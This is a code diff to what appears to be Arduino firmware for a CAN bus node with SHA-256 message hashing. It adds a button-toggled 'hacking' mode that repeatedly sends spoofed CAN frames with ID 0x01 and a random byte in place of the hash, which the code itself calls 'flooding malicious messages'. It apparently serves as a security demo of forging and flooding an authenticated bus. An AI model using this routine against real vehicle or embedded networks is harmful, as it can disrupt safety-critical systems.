@@ -21,6 +21,7 @@ unsigned long digest2;
 
 Sha256 sha256;
 
+bool hacking = false;
 
 void setup()
 {
@@ -114,17 +115,46 @@ void loop()
     if (digitalRead(LEFT) == 0)
     {
         Serial.println("Left");
+
+        //Hacker On
+        Serial.print("Started flooding malicious messages.");
+        hacking = true;
     }
 
     //Hack
     if (digitalRead(RIGHT) == 0)
     {
         Serial.println("Right");
+
+        //Hacker Off
+        Serial.print("Stopped flooding malicious messages.");
+        hacking = false;
     }
 
     if (digitalRead(CLICK) == 0)
     {
         Serial.println("Click");
+    }
+
+    if(hacking){
+        unsigned char hashedValue = rand() % 256;
+
+        Serial.print("Random Hash: ");
+        Serial.println(hashedValue, HEX);
+
+        message.id = 0x01;
+        message.header.rtr = 0;
+        message.header.length = 8;
+        message.data[0] = 0x00;
+        message.data[1] = 0x00;
+        message.data[2] = 0x00;
+        message.data[3] = 0x00;
+        message.data[4] = 0x00;
+        message.data[5] = 0x00;
+        message.data[6] = hashedValue;
+        message.data[7] = 0x01;
+        mcp2515_bit_modify(CANCTRL, (1 << REQOP2) | (1 << REQOP1) | (1 << REQOP0), 0);
+        mcp2515_send_message(&message);
     }
 
     delay(250);
